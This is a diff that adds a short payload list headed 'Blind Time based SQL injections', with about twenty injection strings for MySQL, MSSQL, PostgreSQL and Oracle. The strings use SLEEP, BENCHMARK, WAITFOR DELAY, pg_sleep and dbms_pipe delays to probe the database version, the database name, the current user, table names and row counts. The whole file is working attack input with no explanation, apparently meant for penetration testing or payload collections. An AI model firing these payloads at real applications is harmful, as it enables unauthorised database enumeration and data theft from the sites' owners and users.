@@ -1,0 +1,22 @@
+Blind Time based SQL injections :~
+
+' OR IF(1=1,SLEEP(5),0)--
+' OR IF(1=2,SLEEP(5),0)--
+' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
+' AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+' AND IF((SELECT LENGTH(database()))=6,SLEEP(5),0)--
+' AND IF(user()='root@localhost',SLEEP(5),0)--
+' AND IF(database()='test',SLEEP(5),0)--
+' AND IF((SELECT table_name FROM information_schema.tables LIMIT 1)='users',SLEEP(5),0)--
+' OR SLEEP(5)--
+' AND SLEEP(10)--
+' OR benchmark(5000000,MD5(1))--
+' AND IF(1=1,BENCHMARK(1000000,MD5(1)),0)--
+' WAITFOR DELAY '0:0:5'--
+' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--
+' OR CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END--
+' AND IF((SELECT ASCII(SUBSTRING(user(),1,1)))=114,SLEEP(5),0)--
+' AND IF((SELECT COUNT(*) FROM information_schema.tables)>5,SLEEP(5),0)--
+' OR pg_sleep(5)--
+' OR dbms_pipe.receive_message('a',5)--
